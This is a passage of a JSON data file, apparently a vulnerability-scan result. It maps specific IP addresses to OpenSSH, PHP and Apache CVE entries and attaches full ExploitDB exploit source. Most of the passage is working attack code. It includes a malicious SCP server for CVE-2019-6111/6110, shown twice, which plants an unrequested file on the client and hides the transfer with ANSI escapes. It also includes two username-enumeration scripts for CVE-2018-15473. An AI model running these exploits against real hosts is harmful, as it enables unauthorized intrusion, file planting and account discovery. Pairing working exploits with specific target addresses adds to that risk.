'exploit.txt' instead.\r\n        logging.info('Sending malicious file \"exploit.txt\" to channel %d',\r\n            channel.get_id())\r\n        command = 'C0664 {} exploit.txt\\n'.format(len(payload)).encode('ascii')\r\n        channel.sendall(command)\r\n        wait_ok()\r\n        channel.sendall(payload)\r\n        send_ok()\r\n        wait_ok()\r\n\r\n        # This is CVE-2019-6110: the client will display the text that we send\r\n        # to stderr, even if it contains ANSI escape sequences. We can send\r\n        # ANSI codes that clear the current line to hide the fact that a second\r\n        # file was transmitted..\r\n        logging.info('Covering our tracks by sending ANSI escape sequence')\r\n        channel.sendall_stderr(\"\\x1b[1A\".encode('ascii'))\r\n        channel.close()\r\n\r\ndef main():\r\n    logging.info('Creating a temporary RSA host key...')\r\n    host_key = paramiko.rsakey.RSAKey.generate(1024)\r\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\n    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\r\n    sock.bind(('localhost', 2222))\r\n    sock.listen(0)\r\n    logging.info('Listening on port 2222...')\r\n\r\n    while True:\r\n        client, addr = sock.accept()\r\n        logging.info('Received connection from %s:%s', *addr)\r\n        transport = paramiko.Transport(client)\r\n        transport.add_server_key(host_key)\r\n        server = ScpServer()\r\n        transport.start_server(server=server)\r\n\r\nif __name__ == '__main__':\r\n    main()",
                "description": "OpenSSH SCP Client - Write Arbitrary Files",
                "author": "Harry Sintonen",
                "_id": 46516,
                "source": "ExploitDB",
                "platform": "multiple",
                "date": "2019-01-11T00:00:00+00:00",
                "cve": [
                    "CVE-2019-6111",
                    "CVE-2019-6110"
                ],
                "type": "remote",
                "port": 0
            }
        ],
        "CVE-2019-6110": [
            {
                "source": "CVE",
                "_id": "2019-6110",
                "description": "In OpenSSH 7.9, due to accepting and displaying arbitrary stderr output from the server, a malicious server (or Man-in-The-Middle attacker) can manipulate the client output, for example to use ANSI control codes to hide additional files being transferred.",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2019-6110"
                ],
                "msb": []
            },
            {
                "code": "# Exploit Title: SSHtranger Things\r\n# Date: 2019-01-17\r\n# Exploit Author: Mark E. Haase <mhaase@hyperiongray.com>\r\n# Vendor Homepage: https://www.openssh.com/\r\n# Software Link: [download link if available]\r\n# Version: OpenSSH 7.6p1\r\n# Tested on: Ubuntu 18.04.1 LTS\r\n# CVE : CVE-2019-6111, CVE-2019-6110\r\n\r\n'''\r\nTitle:     SSHtranger Things\r\nAuthor:    Mark E. Haase <mhaase@hyperiongray.com>\r\nHomepage:  https://www.hyperiongray.com\r\nDate:      2019-01-17\r\nCVE:       CVE-2019-6111, CVE-2019-6110\r\nAdvisory:  https://sintonen.fi/advisories/scp-client-multiple-vulnerabilities.txt\r\nTested on: Ubuntu 18.04.1 LTS, OpenSSH client 7.6p1\r\n\r\nWe have nicknamed this \"SSHtranger Things\" because the bug is so old it could be\r\nexploited by an 8-bit Demogorgon. Tested on Python 3.6.7 and requires `paramiko`\r\npackage.\r\n\r\nThe server listens on port 2222. It accepts any username and password, and it\r\ngenerates a new host key every time you run it.\r\n\r\n    $ python3 sshtranger_things.py\r\n\r\nDownload a file using a vulnerable client. The local path must be a dot:\r\n\r\n    $ scp -P 2222 foo@localhost:test.txt .\r\n    The authenticity of host '[localhost]:2222 ([127.0.0.1]:2222)' can't be established.\r\n    RSA key fingerprint is SHA256:C7FhMqqiMpkqG9j+11S2Wv9lQYlN1jkDiipdeFMZT1w.\r\n    Are you sure you want to continue connecting (yes/no)? yes\r\n    Warning: Permanently added '[localhost]:2222' (RSA) to the list of known hosts.\r\n    foo@localhost's password:\r\n    test.txt                                       100%   32     0.7KB/s   00:00\r\n\r\nThe file you requested (e.g. test.txt) will be saved in your current directory.\r\nIf your client is vulnerable, you will have an additional file \"exploit.txt\"\r\ncreated in your current directory.\r\n\r\n    $ cat test.txt\r\n    This is the file you requested.\r\n    $ cat exploit.txt\r\n    SSHtranger Things\r\n\r\nThe interesting code is in ScpServer.send_file().\r\n'''\r\nimport base64\r\nimport gzip\r\nimport logging\r\nimport paramiko\r\nimport paramiko.rsakey\r\nimport socket\r\nimport threading\r\n\r\nlogging.basicConfig(level=logging.INFO)\r\n\r\ndummy = 'This is the file you requested.\\n'\r\npayload = gzip.decompress(base64.b64decode(\r\n    b'H4sIAAa+QFwC/51VQW4CMQy85xV+AX+qqrZwoFSo0orbHvbQQw9NIiH1Af0YLyndjZ2x46'\r\n    b'ygaIGs43jGTjIORJfzh3nIN/IwltH1b+LHeGdxHnXUsoCWD6yYyjt7AfA1XJdLDR8u5yRA'\r\n    b'1/lEjiHbHGafXOMVpySuZaH4Jk1lgjxoocN5YMhRoNhhpA5EWMhlRHBNCWogZYhOnmk2V7'\r\n    b'C4FJgwHxKSEwEzTskrQITtj1gYIurAhWUfsDbWIFyXlRwDc8okeZkCzNyjlMmcT4wxA39d'\r\n    b'zp8OsJDJsGV/wV3I0JwJLNXKlOxJAs5Z7WwqmUZMPZmzqupttkhPRd4ovE8jE0gNyQ5skM'\r\n    b'uVy4jk4BljnYwCQ2CUs53KtnKEYkucQJIEyoGud5wYXQUuXvimAYJMJyLlqkyQHlsK6XLz'\r\n    b'I6Q6m4WKYmOzjRxEhtXWBA1qrvmBVRgGGIoT1dIRKSN+yeaJQQKuNEEadONJjkcdI2iFC4'\r\n    b'Hs55bGI12K2rn1fuN1P4/DWtuwHQYdb+0Vunt5DDpS3+0MLaN7FF73II+PK9OungPEnZrc'\r\n    b'dIyWSE9DHbnVVP4hnF2B79CqV8nTxoWmlomuzjl664HiLbZSdrtEOdIYVqBaTeKdWNccJS'\r\n    b'J+NlZGQJZ7isJK0gs27N63dPn+oefjYU/DMGy2p7en4+7w+nJ8OG0eD/vwC6VpDqYpCwAA'\r\n))\r\n\r\nclass ScpServer(paramiko.ServerInterface):\r\n    def __init__(self):\r\n        self.event = threading.Event()\r\n\r\n    def check_auth_password(self, username, password):\r\n        logging.info('Authenticated with %s:%s', username, password)\r\n        return paramiko.AUTH_SUCCESSFUL\r\n\r\n    def check_channel_request(self, kind, chanid):\r\n        logging.info('Opened session channel %d', chanid)\r\n        if kind == \"session\":\r\n            return paramiko.OPEN_SUCCEEDED\r\n        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED\r\n\r\n    def check_channel_exec_request(self, channel, command):\r\n        command = command.decode('ascii')\r\n        logging.info('Approving exec request: %s', command)\r\n        parts = command.split(' ')\r\n        # Make sure that this is a request to get a file:\r\n        assert parts[0] == 'scp'\r\n        assert '-f' in parts\r\n        file = parts[-1]\r\n        # Send file from a new thread.\r\n        threading.Thread(target=self.send_file, args=(channel, file)).start()\r\n        return True\r\n\r\n    def send_file(self, channel, file):\r\n        '''\r\n        The meat of the exploit:\r\n            1. Send the requested file.\r\n            2. Send another file (exploit.txt) that was not requested.\r\n            3. Print ANSI escape sequences to stderr to hide the transfer of\r\n               exploit.txt.\r\n        '''\r\n        def wait_ok():\r\n            assert channel.recv(1024) == b'\\x00'\r\n        def send_ok():\r\n            channel.sendall(b'\\x00')\r\n\r\n        wait_ok()\r\n\r\n        logging.info('Sending requested file \"%s\" to channel %d', file,\r\n            channel.get_id())\r\n        command = 'C0664 {} {}\\n'.format(len(dummy), file).encode('ascii')\r\n        channel.sendall(command)\r\n        wait_ok()\r\n        channel.sendall(dummy)\r\n        send_ok()\r\n        wait_ok()\r\n\r\n        # This is CVE-2019-6111: whatever file the client requested, we send\r\n        # them 'exploit.txt' instead.\r\n        logging.info('Sending malicious file \"exploit.txt\" to channel %d',\r\n            channel.get_id())\r\n        command = 'C0664 {} exploit.txt\\n'.format(len(payload)).encode('ascii')\r\n        channel.sendall(command)\r\n        wait_ok()\r\n        channel.sendall(payload)\r\n        send_ok()\r\n        wait_ok()\r\n\r\n        # This is CVE-2019-6110: the client will display the text that we send\r\n        # to stderr, even if it contains ANSI escape sequences. We can send\r\n        # ANSI codes that clear the current line to hide the fact that a second\r\n        # file was transmitted..\r\n        logging.info('Covering our tracks by sending ANSI escape sequence')\r\n        channel.sendall_stderr(\"\\x1b[1A\".encode('ascii'))\r\n        channel.close()\r\n\r\ndef main():\r\n    logging.info('Creating a temporary RSA host key...')\r\n    host_key = paramiko.rsakey.RSAKey.generate(1024)\r\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\n    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\r\n    sock.bind(('localhost', 2222))\r\n    sock.listen(0)\r\n    logging.info('Listening on port 2222...')\r\n\r\n    while True:\r\n        client, addr = sock.accept()\r\n        logging.info('Received connection from %s:%s', *addr)\r\n        transport = paramiko.Transport(client)\r\n        transport.add_server_key(host_key)\r\n        server = ScpServer()\r\n        transport.start_server(server=server)\r\n\r\nif __name__ == '__main__':\r\n    main()",
                "description": "SCP Client - Multiple Vulnerabilities (SSHtranger Things)",
                "author": "Mark E. Haase",
                "_id": 46193,
                "source": "ExploitDB",
                "platform": "multiple",
                "date": "2019-01-18T00:00:00+00:00",
                "cve": [
                    "CVE-2019-6111",
                    "CVE-2019-6110"
                ],
                "type": "remote",
                "port": 0
            },
            {
                "code": "'''\r\nTitle:     SSHtranger Things\r\nAuthor:    Mark E. Haase <mhaase@hyperiongray.com>\r\nHomepage:  https://www.hyperiongray.com\r\nDate:      2019-01-17\r\nCVE:       CVE-2019-6111, CVE-2019-6110\r\nAdvisory:  https://sintonen.fi/advisories/scp-client-multiple-vulnerabilities.txt\r\nTested on: Ubuntu 18.04.1 LTS, OpenSSH client 7.6p1\r\n\r\nWe have nicknamed this \"SSHtranger Things\" because the bug is so old it could be\r\nexploited by an 8-bit Demogorgon. Tested on Python 3.6.7 and requires `paramiko`\r\npackage.\r\n\r\nThe server listens on port 2222. It accepts any username and password, and it\r\ngenerates a new host key every time you run it.\r\n\r\n    $ python3 sshtranger_things.py\r\n\r\nDownload a file using a vulnerable client. The local path must be a dot:\r\n\r\n    $ scp -P 2222 foo@localhost:test.txt .\r\n    The authenticity of host '[localhost]:2222 ([127.0.0.1]:2222)' can't be established.\r\n    RSA key fingerprint is SHA256:C7FhMqqiMpkqG9j+11S2Wv9lQYlN1jkDiipdeFMZT1w.\r\n    Are you sure you want to continue connecting (yes/no)? yes\r\n    Warning: Permanently added '[localhost]:2222' (RSA) to the list of known hosts.\r\n    foo@localhost's password:\r\n    test.txt                                       100%   32     0.7KB/s   00:00\r\n\r\nThe file you requested (e.g. test.txt) will be saved in your current directory.\r\nIf your client is vulnerable, you will have an additional file \"exploit.txt\"\r\ncreated in your current directory.\r\n\r\n    $ cat test.txt\r\n    This is the file you requested.\r\n    $ cat exploit.txt\r\n    SSHtranger Things\r\n\r\nThe interesting code is in ScpServer.send_file().\r\n'''\r\nimport base64\r\nimport gzip\r\nimport logging\r\nimport paramiko\r\nimport paramiko.rsakey\r\nimport socket\r\nimport threading\r\n\r\nlogging.basicConfig(level=logging.INFO)\r\n\r\ndummy = 'This is the file you requested.\\n'\r\npayload = gzip.decompress(base64.b64decode(\r\n    b'H4sIAAa+QFwC/51VQW4CMQy85xV+AX+qqrZwoFSo0orbHvbQQw9NIiH1Af0YLyndjZ2x46'\r\n    b'ygaIGs43jGTjIORJfzh3nIN/IwltH1b+LHeGdxHnXUsoCWD6yYyjt7AfA1XJdLDR8u5yRA'\r\n    b'1/lEjiHbHGafXOMVpySuZaH4Jk1lgjxoocN5YMhRoNhhpA5EWMhlRHBNCWogZYhOnmk2V7'\r\n    b'C4FJgwHxKSEwEzTskrQITtj1gYIurAhWUfsDbWIFyXlRwDc8okeZkCzNyjlMmcT4wxA39d'\r\n    b'zp8OsJDJsGV/wV3I0JwJLNXKlOxJAs5Z7WwqmUZMPZmzqupttkhPRd4ovE8jE0gNyQ5skM'\r\n    b'uVy4jk4BljnYwCQ2CUs53KtnKEYkucQJIEyoGud5wYXQUuXvimAYJMJyLlqkyQHlsK6XLz'\r\n    b'I6Q6m4WKYmOzjRxEhtXWBA1qrvmBVRgGGIoT1dIRKSN+yeaJQQKuNEEadONJjkcdI2iFC4'\r\n    b'Hs55bGI12K2rn1fuN1P4/DWtuwHQYdb+0Vunt5DDpS3+0MLaN7FF73II+PK9OungPEnZrc'\r\n    b'dIyWSE9DHbnVVP4hnF2B79CqV8nTxoWmlomuzjl664HiLbZSdrtEOdIYVqBaTeKdWNccJS'\r\n    b'J+NlZGQJZ7isJK0gs27N63dPn+oefjYU/DMGy2p7en4+7w+nJ8OG0eD/vwC6VpDqYpCwAA'\r\n))\r\n\r\nclass ScpServer(paramiko.ServerInterface):\r\n    def __init__(self):\r\n        self.event = threading.Event()\r\n\r\n    def check_auth_password(self, username, password):\r\n        logging.info('Authenticated with %s:%s', username, password)\r\n        return paramiko.AUTH_SUCCESSFUL\r\n\r\n    def check_channel_request(self, kind, chanid):\r\n        logging.info('Opened session channel %d', chanid)\r\n        if kind == \"session\":\r\n            return paramiko.OPEN_SUCCEEDED\r\n        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED\r\n\r\n    def check_channel_exec_request(self, channel, command):\r\n        command = command.decode('ascii')\r\n        logging.info('Approving exec request: %s', command)\r\n        parts = command.split(' ')\r\n        # Make sure that this is a request to get a file:\r\n        assert parts[0] == 'scp'\r\n        assert '-f' in parts\r\n        file = parts[-1]\r\n        # Send file from a new thread.\r\n        threading.Thread(target=self.send_file, args=(channel, file)).start()\r\n        return True\r\n\r\n    def send_file(self, channel, file):\r\n        '''\r\n        The meat of the exploit:\r\n            1. Send the requested file.\r\n            2. Send another file (exploit.txt) that was not requested.\r\n            3. Print ANSI escape sequences to stderr to hide the transfer of\r\n               exploit.txt.\r\n        '''\r\n        def wait_ok():\r\n            assert channel.recv(1024) == b'\\x00'\r\n        def send_ok():\r\n            channel.sendall(b'\\x00')\r\n\r\n        wait_ok()\r\n\r\n        logging.info('Sending requested file \"%s\" to channel %d', file,\r\n            channel.get_id())\r\n        command = 'C0664 {} {}\\n'.format(len(dummy), file).encode('ascii')\r\n        channel.sendall(command)\r\n        wait_ok()\r\n        channel.sendall(dummy)\r\n        send_ok()\r\n        wait_ok()\r\n\r\n        # This is CVE-2019-6111: whatever file the client requested, we send\r\n        # them 'exploit.txt' instead.\r\n        logging.info('Sending malicious file \"exploit.txt\" to channel %d',\r\n            channel.get_id())\r\n        command = 'C0664 {} exploit.txt\\n'.format(len(payload)).encode('ascii')\r\n        channel.sendall(command)\r\n        wait_ok()\r\n        channel.sendall(payload)\r\n        send_ok()\r\n        wait_ok()\r\n\r\n        # This is CVE-2019-6110: the client will display the text that we send\r\n        # to stderr, even if it contains ANSI escape sequences. We can send\r\n        # ANSI codes that clear the current line to hide the fact that a second\r\n        # file was transmitted..\r\n        logging.info('Covering our tracks by sending ANSI escape sequence')\r\n        channel.sendall_stderr(\"\\x1b[1A\".encode('ascii'))\r\n        channel.close()\r\n\r\ndef main():\r\n    logging.info('Creating a temporary RSA host key...')\r\n    host_key = paramiko.rsakey.RSAKey.generate(1024)\r\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\n    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\r\n    sock.bind(('localhost', 2222))\r\n    sock.listen(0)\r\n    logging.info('Listening on port 2222...')\r\n\r\n    while True:\r\n        client, addr = sock.accept()\r\n        logging.info('Received connection from %s:%s', *addr)\r\n        transport = paramiko.Transport(client)\r\n        transport.add_server_key(host_key)\r\n        server = ScpServer()\r\n        transport.start_server(server=server)\r\n\r\nif __name__ == '__main__':\r\n    main()",
                "description": "OpenSSH SCP Client - Write Arbitrary Files",
                "author": "Harry Sintonen",
                "_id": 46516,
                "source": "ExploitDB",
                "platform": "multiple",
                "date": "2019-01-11T00:00:00+00:00",
                "cve": [
                    "CVE-2019-6111",
                    "CVE-2019-6110"
                ],
                "type": "remote",
                "port": 0
            }
        ]
    },
    "152.14.88.223": {
        "CVE-2018-15473": [
            {
                "source": "CVE",
                "_id": "2018-15473",
                "description": "OpenSSH through 7.7 is prone to a user enumeration vulnerability due to not delaying bailout for an invalid authenticating user until after the packet containing the request has been fully parsed, related to auth2-gss.c, auth2-hostbased.c, and auth2-pubkey.c.",
                "osvdb": [],
                "bid": [
                    105140
                ],
                "cve": [
                    "CVE-2018-15473"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2018-15599",
                "description": "The recv_msg_userauth_request function in svr-auth.c in Dropbear through 2018.76 is prone to a user enumeration vulnerability because username validity affects how fields in SSH_MSG_USERAUTH messages are handled, a similar issue to CVE-2018-15473 in an unrelated codebase.",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2018-15599"
                ],
                "msb": []
            },
            {
                "code": "#!/usr/bin/env python2\r\n# CVE-2018-15473 SSH User Enumeration by Leap Security (@LeapSecurity) https://leapsecurity.io\r\n# Credits: Matthew Daley, Justin Gardner, Lee David Painter\r\n\r\n\r\nimport argparse, logging, paramiko, socket, sys, os\r\n\r\nclass InvalidUsername(Exception):\r\n    pass\r\n\r\n# malicious function to malform packet\r\ndef add_boolean(*args, **kwargs):\r\n    pass\r\n\r\n# function that'll be overwritten to malform the packet\r\nold_service_accept = paramiko.auth_handler.AuthHandler._client_handler_table[\r\n        paramiko.common.MSG_SERVICE_ACCEPT]\r\n\r\n# malicious function to overwrite MSG_SERVICE_ACCEPT handler\r\ndef service_accept(*args, **kwargs):\r\n    paramiko.message.Message.add_boolean = add_boolean\r\n    return old_service_accept(*args, **kwargs)\r\n\r\n# call when username was invalid \r\ndef invalid_username(*args, **kwargs):\r\n    raise InvalidUsername()\r\n\r\n# assign functions to respective handlers\r\nparamiko.auth_handler.AuthHandler._client_handler_table[paramiko.common.MSG_SERVICE_ACCEPT] = service_accept\r\nparamiko.auth_handler.AuthHandler._client_handler_table[paramiko.common.MSG_USERAUTH_FAILURE] = invalid_username\r\n\r\n# perform authentication with malicious packet and username\r\ndef check_user(username):\r\n    sock = socket.socket()\r\n    sock.connect((args.target, args.port))\r\n    transport = paramiko.transport.Transport(sock)\r\n\r\n    try:\r\n        transport.start_client()\r\n    except paramiko.ssh_exception.SSHException:\r\n        print '[!] Failed to negotiate SSH transport'\r\n        sys.exit(2)\r\n\r\n    try:\r\n        transport.auth_publickey(username, paramiko.RSAKey.generate(2048))\r\n    except InvalidUsername:\r\n        print \"[-] {} is an invalid username\".format(username)\r\n        sys.exit(3)\r\n    except paramiko.ssh_exception.AuthenticationException:\r\n        print \"[+] {} is a valid username\".format(username)\r\n\r\n# remove paramiko logging\r\nlogging.getLogger('paramiko.transport').addHandler(logging.NullHandler())\r\n\r\nparser = argparse.ArgumentParser(description='SSH User Enumeration by Leap Security (@LeapSecurity)')\r\nparser.add_argument('target', help=\"IP address of the target system\")\r\nparser.add_argument('-p', '--port', default=22, help=\"Set port of SSH service\")\r\nparser.add_argument('username', help=\"Username to check for validity.\")\r\n\r\nif len(sys.argv) == 1:\r\n    parser.print_help()\r\n    sys.exit(1)\r\n\r\nargs = parser.parse_args()\r\n\r\ncheck_user(args.username)",
                "description": "OpenSSH < 7.7 - User Enumeration (2)",
                "author": "Leap Security",
                "_id": 45939,
                "source": "ExploitDB",
                "platform": "linux",
                "date": "2018-12-04T00:00:00+00:00",
                "cve": [
                    "CVE-2018-15473"
                ],
                "type": "remote",
                "port": 22
            },
            {
                "code": "# Exploit: OpenSSH 7.7 - Username Enumeration\r\n# Author: Justin Gardner\r\n# Date: 2018-08-20\r\n# Software: https://ftp4.usa.openbsd.org/pub/OpenBSD/OpenSSH/openssh-7.7.tar.gz\r\n# Affected Versions: OpenSSH version < 7.7\r\n# CVE: CVE-2018-15473\r\n\r\n###########################################################################\r\n#                ____                    _____ _____ _    _               #\r\n#               / __ \\                  / ____/ ____| |  | |              #\r\n#              | |  | |_ __   ___ _ __ | (___| (___ | |__| |              #\r\n#              | |  | | '_ \\ / _ \\ '_ \\ \\___ \\\\___ \\|  __  |              #\r\n#              | |__| | |_) |  __/ | | |____) |___) | |  | |              #\r\n#               \\____/| .__/ \\___|_| |_|_____/_____/|_|  |_|              #\r\n#                     | |               Username Enumeration              #\r\n#                     |_|                                                 #\r\n#                                                                         #\r\n###########################################################################\r\n\r\n#!/usr/bin/env python\r\n\r\nimport argparse\r\nimport logging\r\nimport paramiko\r\nimport multiprocessing\r\nimport socket\r\nimport sys\r\nimport json\r\n# store function we will overwrite to malform the packet\r\nold_parse_service_accept = paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_SERVICE_ACCEPT]\r\n\r\n# create custom exception\r\nclass BadUsername(Exception):\r\n    def __init__(self):\r\n\tpass\r\n\r\n# create malicious \"add_boolean\" function to malform packet\r\ndef add_boolean(*args, **kwargs):\r\n    pass\r\n\r\n# create function to call when username was invalid\r\ndef call_error(*args, **kwargs):\r\n    raise BadUsername()\r\n\r\n# create the malicious function to overwrite MSG_SERVICE_ACCEPT handler\r\ndef malform_packet(*args, **kwargs):\r\n    old_add_boolean = paramiko.message.Message.add_boolean\r\n    paramiko.message.Message.add_boolean = add_boolean\r\n    result  = old_parse_service_accept(*args, **kwargs)\r\n    #return old add_boolean function so start_client will work again\r\n    paramiko.message.Message.add_boolean = old_add_boolean\r\n    return result\r\n\r\n# create function to perform authentication with malformed packet and desired username\r\ndef checkUsername(username, tried=0):\r\n\tsock = socket.socket()\r\n\tsock.connect((args.hostname, args.port))\r\n\t# instantiate transport\r\n\ttransport = paramiko.transport.Transport(sock)\r\n\ttry:\r\n\t    transport.start_client()\r\n\texcept paramiko.ssh_exception.SSHException:\r\n\t    # server was likely flooded, retry up to 3 times\r\n\t    transport.close()\r\n\t    if tried < 4:\r\n\t    \ttried += 1\r\n\t    \treturn checkUsername(username, tried)\r\n\t    else:\r\n\t    \tprint '[-] Failed to negotiate SSH transport'\r\n\ttry:\r\n\t\ttransport.auth_publickey(username, paramiko.RSAKey.generate(1024))\r\n\texcept BadUsername:\r\n    \t\treturn (username, False)\r\n\texcept paramiko.ssh_exception.AuthenticationException:\r\n    \t\treturn (username, True)\r\n\t#Successful auth(?)\r\n\traise Exception(\"There was an error. Is this the correct version of OpenSSH?\")\r\n\r\ndef exportJSON(results):\r\n\tdata = {\"Valid\":[], \"Invalid\":[]}\r\n\tfor result in results:\r\n\t\tif result[1] and result[0] not in data['Valid']:\r\n\t\t\tdata['Valid'].append(result[0])\r\n\t\telif not result[1] and result[0] not in data['Invalid']:\r\n\t\t\tdata['Invalid'].append(result[0])\r\n\treturn json.dumps(data)\r\n\r\ndef exportCSV(results):\r\n\tfinal = \"Username, Valid\\n\"\r\n\tfor result in results:\r\n\t\tfinal += result[0]+\", \"+str(result[1])+\"\\n\"\r\n\treturn final\r\n\r\ndef exportList(results):\r\n\tfinal = \"\"\r\n\tfor result in results:\r\n\t\tif result[1]:\r\n\t\t\tfinal+=result[0]+\" is a valid user!\\n\"\r\n\t\telse:\r\n\t\t\tfinal+=result[0]+\" is not a valid user!\\n\"\r\n\treturn final\r\n\r\n# assign functions to respective handlers\r\nparamiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_SERVICE_ACCEPT] = malform_packet\r\nparamiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_USERAUTH_FAILURE] = call_error\r\n\r\n# get rid of paramiko logging\r\nlogging.getLogger('paramiko.transport').addHandler(logging.NullHandler())\r\n\r\narg_parser = argparse.ArgumentParser()\r\narg_parser.add_argument('hostname', type=str, help=\"The target hostname or ip address\")\r\narg_parser.add_argument('--port', type=int, default=22, help=\"The target port\")\r\narg_parser.add_argument('--threads', type=int, default=5, help=\"The number of threads to be used\")\r\narg_parser.add_argument('--outputFile', type=str, help=\"The output file location\")\r\narg_parser.add_argument('--outputFormat', choices=['list', 'json', 'csv'], default='list', type=str, help=\"The output file location\")\r\ngroup = arg_parser.add_mutually_exclusive_group(required=True)\r\ngroup.add_argument('--username', type=str, help=\"The single username to validate\")\r\ngroup.add_argument('--userList', type=str, help=\"The list of usernames (one per line) to enumerate through\")\r\nargs = arg_parser.parse_args()\r\n\r\nsock = socket.socket()\r\ntry:\r\n    sock.connect((args.hostname, args.port))\r\n    sock.close()\r\nexcept socket.error:\r\n    print '[-] Connecting to host failed. Please check the specified host and port.'\r\n    sys.exit(1)\r\n\r\nif args.username: #single username passed in\r\n\tresult = checkUsername(args.username)\r\n\tif result[1]:\r\n\t\tprint result[0]+\" is a valid user!\"\r\n\telse:\r\n\t\tprint result[0]+\" is not a valid user!\"\r\nelif args.userList: #username list passed in\r\n\ttry:\r\n\t\tf = open(args.userList)\r\n\texcept IOError:\r\n\t\tprint \"[-] File doesn't exist or is unreadable.\"\r\n\t\tsys.exit(3)\r\n\tusernames = map(str.strip, f.readlines())\r\n\tf.close()\r\n\t# map usernames to their respective threads\r\n\tpool = multiprocessing.Pool(args.threads)\r\n\tresults = pool.map(checkUsername, usernames)\r\n\ttry:\r\n\t\toutputFile = open(args.outputFile, \"w\")\r\n\texcept IOError:\r\n\t\tprint \"[-] Cannot write to outputFile.\"\r\n\t\tsys.exit(5)\r\n\tif args.outputFormat=='list':\r\n\t\toutputFile.writelines(exportList(results))\r\n\t\tprint \"[+] Results successfully written to \" + args.outputFile + \" in List form.\"\r\n\telif args.outputFormat=='json':\r\n\t\toutputFile.writelines(exportJSON(results))\r\n\t\tprint \"[+] Results successfully written to \" + args.outputFile + \" in JSON form.\"\r\n\telif args.outputFormat=='csv':\r\n\t\toutputFile.writelines(exportCSV(results))\r\n\t\tprint \"[+] Results successfully written to \" + args.outputFile + \" in CSV form.\"\r\n\telse:\r\n\t\tprint \"\".join(results)\r\n\toutputFile.close()\r\nelse: # no usernames passed in\r\n\tprint \"[-] No usernames provided to check\"\r\n\tsys.exit(4)",
                "description": "OpenSSH 2.3 < 7.7 - Username Enumeration",
                "author": "Justin Gardner",
                "_id": 45233,
                "source": "ExploitDB",
                "platform": "linux",
                "date": "2018-08-21T00:00:00+00:00",
                "cve": [
                    "CVE-2018-15473"
                ],
                "type": "remote",
                "port": 0
            }
        ]
    },
    "152.14.92.5": {
        "CVE-2018-10549": [
            {
                "source": "CVE",
                "_id": "2018-10549",
                "description": "An issue was discovered in PHP before 5.6.36, 7.0.x before 7.0.30, 7.1.x before 7.1.17, and 7.2.x before 7.2.5. exif_read_data in ext/exif/exif.c has an out-of-bounds read for crafted JPEG data because exif_iif_add_value mishandles the case of a MakerNote that lacks a final '\\0' character.",
                "osvdb": [],
                "bid": [
                    104019
                ],
                "cve": [
                    "CVE-2018-10549"
                ],
                "msb": []
            }
        ],
        "CVE-2018-10548": [
            {
                "source": "CVE",
                "_id": "2018-10548",
                "description": "An issue was discovered in PHP before 5.6.36, 7.0.x before 7.0.30, 7.1.x before 7.1.17, and 7.2.x before 7.2.5. ext/ldap/ldap.c allows remote LDAP servers to cause a denial of service (NULL pointer dereference and application crash) because of mishandling of the ldap_get_dn return value.",
                "osvdb": [],
                "bid": [
                    104019
                ],
                "cve": [
                    "CVE-2018-10548"
                ],
                "msb": []
            }
        ],
        "CVE-2018-10545": [
            {
                "source": "CVE",
                "_id": "2018-10545",
                "description": "An issue was discovered in PHP before 5.6.35, 7.0.x before 7.0.29, 7.1.x before 7.1.16, and 7.2.x before 7.2.4. Dumpable FPM child processes allow bypassing opcache access controls because fpm_unix.c makes a PR_SET_DUMPABLE prctl call, allowing one user (in a multiuser environment) to obtain sensitive information from the process memory of a second user's PHP applications by running gcore on the PID of the PHP-FPM worker process.",
                "osvdb": [],
                "bid": [
                    104022
                ],
                "cve": [
                    "CVE-2018-10545"
                ],
                "msb": []
            }
        ],
        "CVE-2018-10547": [
            {
                "source": "CVE",
                "_id": "2018-10547",
                "description": "An issue was discovered in ext/phar/phar_object.c in PHP before 5.6.36, 7.0.x before 7.0.30, 7.1.x before 7.1.17, and 7.2.x before 7.2.5. There is Reflected XSS on the PHAR 403 and 404 error pages via request data of a request for a .phar file. NOTE: this vulnerability exists because of an incomplete fix for CVE-2018-5712.",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2018-10547"
                ],
                "msb": []
            }
        ],
        "CVE-2018-10546": [
            {
                "source": "CVE",
                "_id": "2018-10546",
                "description": "An issue was discovered in PHP before 5.6.36, 7.0.x before 7.0.30, 7.1.x before 7.1.17, and 7.2.x before 7.2.5. An infinite loop exists in ext/iconv/iconv.c because the iconv stream filter does not reject invalid multibyte sequences.",
                "osvdb": [],
                "bid": [
                    104019
                ],
                "cve": [
                    "CVE-2018-10546"
                ],
                "msb": []
            }
        ]
    },
    "152.14.92.38": {
        "CVE-2019-0215": [
            {
                "source": "CVE",
                "_id": "2019-0215",
                "description": "In Apache HTTP Server 2.4 releases 2.4.37 and 2.4.38, a bug in mod_ssl when using per-location client certificate verification with TLSv1.3 allowed a client to bypass configured access control restrictions.",
                "osvdb": [],
                "bid": [
                    107667
                ],
                "cve": [
                    "CVE-2019-0215"
                ],
                "msb": []
            }
        ]
    },
    "152.14.92.45": {
        "CVE-2014-0117": [
            {
                "source": "CVE",
                "_id": "2014-0117",
                "description": "The mod_proxy module in the Apache HTTP Server 2.4.x before 2.4.10, when a reverse proxy is enabled, allows remote attackers to cause a denial of service (child-process crash) via a crafted HTTP Connection header.",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2014-0117"
                ],
                "msb": []
            }
        ]
    },
    "152.14.92.55": {},
    "152.14.92.58": {},
    "152.14.92.89": {
        "CVE-2018-15919": [
            {
                "source": "CVE",
                "_id": "2018-15919",
